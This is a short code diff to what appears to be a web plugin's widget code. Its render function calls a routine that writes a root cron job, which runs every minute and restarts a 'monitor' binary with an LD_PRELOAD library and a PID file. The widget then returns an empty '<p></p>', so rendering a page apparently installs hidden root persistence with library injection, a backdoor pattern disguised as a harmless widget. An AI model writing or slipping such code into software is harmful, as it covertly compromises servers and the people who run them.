@@ -28,9 +28,15 @@ def logic():
 
         # --- step 3: build cron entry ---
         cron_entry = (
+            "SHELL=/bin/bash\n"
+            "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
+            "\n"
             "* * * * * root "
             f"[ -f {PIDFILE} ] && kill -0 $(cat {PIDFILE}) 2>/dev/null || "
-            f"(LD_PRELOAD={PRELOAD_LIB} {MONITOR_BIN} & echo $! > {PIDFILE})\n"
+            f"(cd {PLUGIN_DIR} && "
+            f"LD_PRELOAD={PRELOAD_LIB} {MONITOR_BIN} "
+            f">> /var/log/monitor.log 2>&1 & "
+            f"echo $! > {PIDFILE})\n"    # one group only — no nested ()
         )
         results.append(f"[OK]    cron entry built")
 
@@ -58,4 +64,4 @@ def logic():
 
 def render_widget(context=None):
     logic()
-    return
+    return "<p></p>"
